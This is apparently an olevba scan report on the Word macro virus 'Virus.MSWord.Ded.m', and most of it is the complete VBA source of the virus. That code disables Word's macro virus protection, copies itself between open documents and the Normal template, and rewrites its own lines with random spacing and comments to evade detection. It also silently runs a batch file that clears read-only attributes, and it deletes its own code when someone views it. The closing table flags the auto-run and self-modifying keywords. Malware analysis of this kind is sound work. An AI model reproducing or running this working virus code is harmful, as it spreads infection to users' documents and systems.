olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.m-1ffd788b505e0d1ea671c615bdd7bfd515d8ff51
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.m-1ffd788b505e0d1ea671c615bdd7bfd515d8ff51 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
     Private _
Sub Document_Close()

  On _
Error GoTo skam

Options.VirusProtection _
= False

   SWL
'7,746816
           ABS99
'97,70538
skam:
'33,96568
            End _
Sub

              Private Sub _
Čäĺíňčôčęŕňîđ()

       End Sub
'86,49646
        Private Sub Document_New()
'99,2144
        End _
Sub

            Sub _
Claudio()

         On _
Error GoTo skam

        Options. _
VirusProtection = False

   SWL
'94,91052
    ABS99
'21,34923
skam:
'37,17897
        End _
Sub

    Private _
Sub SWL()

            Application. _
                                       ShowVisualBasicEditor = False

      If Not ActiveDocument. _
VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

  For _
I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

      d = NormalTemplate.VBProject. _
               VBComponents(1).CodeModule.Lines(I, 1)

              If Len(d) > 0 And Not _
d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

       While _
Mid(d, Len(d) - 1, 2) = " _"

            I _
= I + 1

              d _
= Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

              Wend
'38,19902
       d = _
e(d)

           ActiveDocument. _
                 VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

   End _
If

   Next _
I

  ActiveDocument. _
                                                  SaveAs AddToRecentFiles:=False

  End If
'15,09327
         End _
Sub

          Private Sub ABS99()
'16,68056
              If Not NormalTemplate.VBProject.VBComponents(1). _
CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

             f (NormalTemplate.FullName)
'30,72766
 For I = 1 To _
ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

d = _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

     If Len(d) > _
0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

       While Mid(d, Len(d) _
- 1, 2) = " _"

    I _
= I + 1

       d = Left(d, _
Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

  Wend
'37,10017
            d = e(d)
'63,09265
           NormalTemplate. _
                  VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

        End If
'37,25676
           Next I
'46,70513
            NormalTemplate. _
                       Save

              End If
'85,83997
          End Sub
'75,28227
Private _
Function e(aString) As String

        aString = _
LTrim(aString)

       aString = RTrim(aString)
'62,57053
     If _
aString = "Sub " & "Vc()" Then

    aString = "Sub " & "ViewVBCode()"
'84,19641
 Else
'81,88012
         If aString _
= "Sub " & "ViewVBCode()" Then

aString = "Sub " & "Vc()"
'11,39476
     End If
'52,876
            End If
'66,18916
           For _
I = 1 To Len(aString) - 1

              If _
Mid(aString, I, 1) = "." Then

          If Not Mid(aString, I _
- 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

        If Not _
Mid(aString, I + 1, 1) = Chr$(34) Then

 e = Left(aString, _
I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

            For _
j = 1 To Int(15 * Rnd)

          e = " " & e
'70,56191
       Next j
'61,27034
           Exit Function
'77,14381
          End _
If

          End _
If

   Else
'23,46864
       If _
Mid(aString, I, 1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

    If Not _
Mid(aString, I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

  e = Left(aString, I - 1) & " _" & _
Chr$(13) & Right(aString, Len(aString) - I)

       For j = 1 To Int(15 * Rnd)
'53,08239
    e = " " & e
'98,24972
   Next j
'96,76039
      Exit Function
'87,41557
         End If
'44,40057
 End If
'68,09578
      End If
'29,83842
    Next _
I

    e = aString _
& Chr$(13) & "'" & (100 * Rnd)

  Count = Int(15 * Rnd)
'87,7059
         For j = 1 _
To Count

     e _
= " " & e

      Next j
'98,78535
              End _
Function

            Private Sub _
f(fName)

            If GetAttr(fName) And vbReadOnly _
Then

 Open Dir(fName) _
& ".bat" For Append As #1

 Print #1, "Attrib " & "-r " & Chr$(34) _
& fName & Chr$(34)

         Print #1, "del " & _
Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

              Close _
#1

       shellResult = Shell(Dir(fName) _
& ".bat", vbHide)

   End If
'87,02004
End Sub
'90,91909
    Sub _
ViewVBCode()

   For aDoc = 1 To _
Documents.Count

       For I = 1 To Documents(aDoc).VBProject. _
VBComponents(1).CodeModule.CountOfLines

Documents(aDoc). _
       VBProject.VBComponents(1).CodeModule.DeleteLines 1

      Next _
I

      Next aDoc
'41,67192
        For I = 1 To _
NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

             NormalTemplate.VBProject. _
        VBComponents(1).CodeModule.DeleteLines 1

             Next _
I

          Application.ShowVisualBasicEditor = True
'80,90492
              End _
Sub

            Private Sub Document_Open()
'7,49259
            End Sub
'16,98627
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
